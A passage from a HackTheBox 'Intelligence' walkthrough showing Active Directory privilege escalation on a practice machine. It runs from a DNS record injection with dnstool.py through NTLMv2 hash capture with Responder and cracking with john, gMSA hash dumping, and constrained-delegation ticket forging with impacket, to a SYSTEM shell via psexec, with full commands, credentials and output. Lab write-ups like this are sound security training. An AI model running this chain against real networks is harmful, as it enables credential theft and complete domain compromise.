Now, we need to gain access as `Tiffany.Molina:NewIntelligenceCorpUser9876`. win-rm doesn't work for this user. Okay, let's enumerate further for privesc.

## Privilege escalation

### SMB

```bash
──(root💀kali)-[~/…/Medium/Intelligence/enum/http]
└─# smbclient -U 'Tiffany.Molina' -L \\\\10.10.10.248\\                                                                                                                                                                                  1 ⨯
Enter WORKGROUP\Tiffany.Molina's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```

```bash
┌──(root💀kali)-[~/…/HackTheBox/Medium/Intelligence/gain_access]
└─# smbmap -u "Tiffany.Molina" -p "NewIntelligenceCorpUser9876" -H 10.10.10.248                                                                                                                                                        130 ⨯
[+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

From IT share:

```powershell
┌──(root💀kali)-[~/…/HackTheBox/Medium/Intelligence/gain_access]
└─# cat downdetector.ps1          
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

The script is scheduled to run every 5 min. Okay, what it does& It searches in DNS records and if it find `web*.intelligence.htb` records, it will perform a request to it. Also, the user will perform authentication, because `Invoke-WebRequest` has option `-UseDefaultCredentials`. So, we need somehow add a new dns record with our ip address and use Responder to capture auth. After some time of searching, I found this tool: [https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx). It has [dnstool.py](http://dnstool.py) which add DNS records as AD user. Let's use it and add a record with our ip address.

Finally, I did it:

```bash
┌──(root💀kali)-[~/tools/krbrelayx]
└─# python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -d 10.10.14.15 -r weblol.intelligence.htb 10.10.10.248                                                                                   1 ⨯
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
/root/tools/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
[-] Adding new record
[+] LDAP operation completed successfully
```

Now, start [responder.py](http://responder.py), but the old one ([https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)). For me with the current Responder it didn't work out, so, I used the prev version and it works well `Responder.py -I tun0 -A`:

```bash
+] Listening for events...
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:1122334455667788:8BC4F967DDD65E72BB8236C9EF03F161:01010000000000009463D3D5CABBD70122D41DF0F9C2EB38000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000002000006EF73C2D01D9D6D4E6B738D6255F9B99E7AD02572A5B3D1894161A3CDD8097420A001000000000000000000000000000000000000900380048005400540050002F007700650062006100700070002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000                           
[*] Skipping previously captured hash for intelligence\Ted.Graves
```

Cracked the hash and obtained password with john:

```bash
┌──(root💀kali)-[~/…/HackTheBox/Medium/Intelligence/privesc]
└─# john -w=/usr/share/wordlists/rockyou.txt hash      
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)
1g 0:00:00:09 DONE (2021-10-07 11:32) 0.1052g/s 1138Kp/s 1138Kc/s 1138KC/s Mrz.deltasigma..Morgant1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

With ldapsearch I gathered all info about the domain:

```bash
┌──(root💀kali)-[~/…/HackTheBox/Medium/Intelligence/privesc]
└─# ldapsearch -x -h 10.10.10.248 -D 'INTELLIGENCE\Ted.Graves' -w 'Mr.Teddy' -b "DC=intelligence,DC=htb" > ldapsearch_intelligence_htb
```

Then, I searched CN:

```bash
┌──(root💀kali)-[~/…/HackTheBox/Medium/Intelligence/privesc]
└─# cat ldapsearch_intelligence_htb | grep cn
```

And in the end, I noticed an account - srv\_int. Then, I gathered all info about this account:

```bash
┌──(root💀kali)-[~/…/HackTheBox/Medium/Intelligence/privesc]
└─# ldapsearch -x -h 10.10.10.248 -D 'INTELLIGENCE\Ted.Graves' -w 'Mr.Teddy' -b "CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb" > ldapsearch_srv_int
```

Here, you can see what does it mean: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md#gmsa-attributes-in-the-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#gmsa-attributes-in-the-active-directory).

```bash
┌──(root💀kali)-[~/tools/gMSADumper]
└─# python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb                                                                                                                                                            130 ⨯
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::d170ae19de30439df55d6430e12dd621
```

We will not be able to crack this hash, because the password changes every 30 days and consists of 128 chars. Also, we can see this field in service account `msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb`.

[https://book.hacktricks.xyz/windows/active-directory-methodology/silver-ticket](https://book.hacktricks.xyz/windows/active-directory-methodology/silver-ticket)

So, we need to use getST from impacket and try to generate silver ticket and impersonate administrator:

```bash
──(root💀kali)-[~/tools/gMSADumper]
└─# impacket-getST 'intelligence.htb/svc_int$' -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' -hashes ':d170ae19de30439df55d6430e12dd621'                                                                                   1 ⨯
Impacket v0.9.24.dev1+20210928.152630.ff7c521a - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~/tools/gMSADumper]
└─# export KRB5CCNAME=Administrator.ccache                                                                                                            
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~/tools/gMSADumper]
└─# psexec.py -k Intelligence.htb/Administrator@dc.Intelligence.htb -no-pass                                                                          
Impacket v0.9.24.dev1+20210928.152630.ff7c521a - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on dc.Intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file bwDcOYKG.exe
[*] Opening SVCManager on dc.Intelligence.htb.....
[*] Creating service VyYx on dc.Intelligence.htb.....
[*] Starting service VyYx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```
